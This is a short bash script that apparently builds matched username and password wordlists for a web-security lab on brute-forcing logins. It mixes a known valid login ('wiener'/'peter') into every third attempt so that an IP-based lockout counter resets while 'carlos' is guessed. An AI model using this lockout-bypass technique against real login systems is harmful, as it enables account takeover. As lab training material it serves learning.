#!/bin/bash

echo "###########The following are the usernames:###############"

# Loop to print usernames
for ((i = 0; i < 150; i++)); do
    if (( i % 3 == 0 )); then
        echo "wiener"
    else
        echo "carlos"
    fi
done

echo "##############The following are the passwords:############"

# Read passwords from the 'passwords.txt' file
if [[ -f "passwords.txt" ]]; then
    i=0
    while IFS= read -r pwd; do
        if (( i % 3 == 0 )); then
            echo "peter"
            echo "$pwd"
        else
            echo "$pwd"
        fi
        ((i++))
    done < "passwords.txt"
else
    echo "Error: File 'passwords.txt' not found."
    exit 1
fi
